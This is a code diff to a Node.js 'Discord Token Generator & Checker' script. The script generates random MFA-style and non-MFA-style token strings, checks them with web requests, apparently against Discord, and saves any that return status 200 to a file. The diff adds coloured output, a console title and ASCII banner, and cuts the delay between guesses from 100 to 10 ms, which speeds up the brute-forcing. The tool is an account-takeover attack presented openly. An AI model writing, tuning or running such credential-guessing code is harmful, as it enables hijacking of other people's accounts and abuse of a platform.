@@ -1,7 +1,13 @@
 //Dependencies
+const readline = require('readline').createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
 const RandomString = require("randomstring")
 const Request = require("request")
 const Delay = require("delay")
+const Chalk = require("chalk")
+var setTitle = require('console-title');
 const Fs = require("fs")
 
 //Variables
@@ -20,10 +26,33 @@ if(Self_Args[0] == ""){
 }
 
 Fs.writeFileSync(Self_Args[0], "", "utf8")
+setTitle(`Discord Token Generator & Checker | DT G&C | Dev: I2rys | Menu Dev: cutieQue | Assistant Dev: cutieQue`);
+console.clear()
+console.log(Chalk.yellowBright(`
+
+██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
+██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
+██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
+██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
+██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
+╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝
+
+░██████╗░███████╗███╗░░██╗  ░█████╗░███╗░░██╗██████╗░  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗
+██╔════╝░██╔════╝████╗░██║  ██╔══██╗████╗░██║██╔══██╗  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝
+██║░░██╗░█████╗░░██╔██╗██║  ███████║██╔██╗██║██║░░██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░
+██║░░╚██╗██╔══╝░░██║╚████║  ██╔══██║██║╚████║██║░░██║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░
+╚██████╔╝███████╗██║░╚███║  ██║░░██║██║░╚███║██████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗
+░╚═════╝░╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝
+                                        - Dev : I2rys
+                                        - Menu Dev : cutieQue
+
+`))
+    console.log(Chalk.blueBright(`DT G&C Started!`))
+    console.log("")
 
 G_A_C()
 async function G_A_C(){
-    await Delay(100)
+   await Delay(10)
 
     var mfa_token = RandomString.generate({
         length: 84,
@@ -57,7 +86,7 @@ async function G_A_C(){
         if(err){}
 
         if(res.statusCode == 200){
-            console.log(`Valid token: ${mfa_token}`)
+            console.log(Chalk.greenBright(`Valid token: ${mfa_token}`))
 
             const data = Fs.readFileSync(Self_Args[0], "utf8")
 
@@ -67,7 +96,7 @@ async function G_A_C(){
                 Fs.writeFileSync(Self_Args[0], `${data}\n${mfa_token}`, "utf8")
             }
         }else{
-            console.log(`Invalid token: ${mfa_token}`)
+            console.log(Chalk.redBright(`Invalid token: ${mfa_token}`))
         }
 
         R_2()
@@ -82,7 +111,7 @@ async function G_A_C(){
             if(err){}
 
             if(res.statusCode == 200){
-                console.log(`Valid token: ${not_mfa_token}`)
+                console.log(Chalk.greenBright(`Valid token: ${not_mfa_token}`))
 
                 const data = Fs.readFileSync(Self_Args[0], "utf8")
 
@@ -92,7 +121,7 @@ async function G_A_C(){
                     Fs.writeFileSync(Self_Args[0], `${data}\n${not_mfa_token}`, "utf8")
                 }
             }else{
-                console.log(`Invalid token: ${not_mfa_token}`)
+                console.log(Chalk.redBright(`Invalid token: ${not_mfa_token}`))
             }
 
             G_A_C()
